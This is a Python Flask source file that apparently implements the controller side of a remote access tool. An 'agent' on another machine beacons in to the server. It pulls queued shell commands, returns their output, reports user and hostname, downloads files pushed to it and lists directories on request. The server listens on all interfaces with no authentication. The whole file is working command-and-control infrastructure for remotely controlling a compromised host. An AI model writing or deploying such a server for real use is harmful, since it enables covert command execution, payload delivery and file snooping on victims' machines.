from flask import Flask, request, jsonify, render_template, redirect, url_for
import time
from datetime import datetime

app = Flask(__name__)

system_info = {}
info_requested = False
terminal_prompt = "user@agent"
last_seen = 0
ping_requested = False
last_seen_timestamp = None

state = {
    "command": None,
    "result": None,
    "acknowledged": False,
}
uploaded_file = {
    "filename": None,
    "content": None,
    "delivered": False
}

file_browse = {
    "path": None,
    "listing": [],
    "requested": False,
    "acknowledged": False
}


@app.route('/')
def index():
    return render_template('terminal.html', prompt_host=terminal_prompt)

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    global last_seen, last_seen_timestamp
    last_seen = time.time()
    last_seen_timestamp = datetime.now().strftime("%I:%M:%S %p")
    print("[HEARTBEAT] Agent pinged")
    return '', 204

@app.route('/status')
def status():
    online = time.time() - last_seen < 10
    return jsonify({
        "online": online,
        "last_seen": last_seen_timestamp or "Never"
    })

@app.route('/request_ping', methods=['POST'])
def request_ping():
    global ping_requested
    ping_requested = True
    return '', 204

@app.route('/should_ping', methods=['GET'])
def should_ping():
    global ping_requested
    if ping_requested:
        ping_requested = False
        return "yes"
    return "no"

@app.route('/set_command', methods=['POST'])
def set_command():
    data = request.get_json()
    state["command"] = data.get("command")
    state["result"] = None
    state["acknowledged"] = False
    print(f"[SET] Command set: {state['command']}")
    return '', 204

@app.route('/get_command', methods=['GET'])
def get_command():
    if not state["acknowledged"] and state["command"]:
        print(f"[GET] Agent pulled command: {state['command']}")
        return state["command"]
    return "none"

@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.get_json()
    result = data.get('result', '').strip()
    if result:
        state["result"] = result
        state["acknowledged"] = True
        state["command"] = None
        print(f"[POST] Result received:\n{result}")
    return '', 204

@app.route('/get_result', methods=['GET'])
def get_result():
    if state["acknowledged"] and state["result"]:
        return state["result"]
    return "pending"

@app.route('/system')
def system():
    return render_template('system.html', info=system_info)

@app.route('/request_info', methods=['GET'])
def request_info():
    global info_requested
    info_requested = True
    return redirect(url_for('system'))

@app.route('/should_post_info', methods=['GET'])
def should_post_info():
    return "yes" if info_requested else "no"

@app.route('/post_info', methods=['POST'])
def post_info():
    global system_info, info_requested, terminal_prompt
    system_info = request.get_json()
    info_requested = False

    user = system_info.get("user", "user")
    hostname = system_info.get("hostname", "agent")
    terminal_prompt = f"{user}@{hostname}"

    print(f"[SYSINFO] Received system info from {terminal_prompt}")
    return '', 204

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    global uploaded_file
    if request.method == 'POST':
        f = request.files['file']
        uploaded_file['filename'] = f.filename
        uploaded_file['content'] = f.read()
        uploaded_file['delivered'] = False
        print(f"[UPLOAD] Received file: {f.filename}")
        return redirect(url_for('index'))
    return render_template('upload.html')


@app.route('/get_file', methods=['GET'])
def get_file():
    if uploaded_file['filename'] and not uploaded_file['delivered']:
        return jsonify({
            "filename": uploaded_file['filename'],
            "content": uploaded_file['content'].decode('latin1')
        })
    return jsonify({"filename": None})

@app.route('/ack_file', methods=['POST'])
def ack_file():
    uploaded_file['filename'] = None
    uploaded_file['content'] = None
    uploaded_file['delivered'] = True
    print("[UPLOAD] Agent confirmed file download")
    return '', 204

@app.route('/system_data')
def system_data():
    return jsonify(system_info)

@app.route('/browse')
def browse():
    return render_template('filemanager.html', listing=file_browse["listing"], path=file_browse["path"])

@app.route('/request_browse', methods=['POST'])
def request_browse():
    data = request.get_json()
    file_browse["path"] = data.get("path", ".")
    file_browse["requested"] = True
    file_browse["acknowledged"] = False
    file_browse["listing"] = []
    return '', 204

@app.route('/should_browse')
def should_browse():
    if file_browse["requested"] and not file_browse["acknowledged"]:
        return jsonify({"path": file_browse["path"]})
    return jsonify({"path": None})

@app.route('/post_listing', methods=['POST'])
def post_listing():
    data = request.get_json()
    file_browse["listing"] = data.get("listing", [])
    file_browse["acknowledged"] = True
    file_browse["requested"] = False
    print(f"[BROWSE] Listing received for: {file_browse['path']}")
    return '', 204

@app.route('/file_listing')
def file_listing():
    return jsonify({
        "path": file_browse["path"],
        "listing": file_browse["listing"]
    })

if __name__ == '__main__':
    print("[*] Flask live terminal server running...")
    app.run(host='0.0.0.0', port=5001)
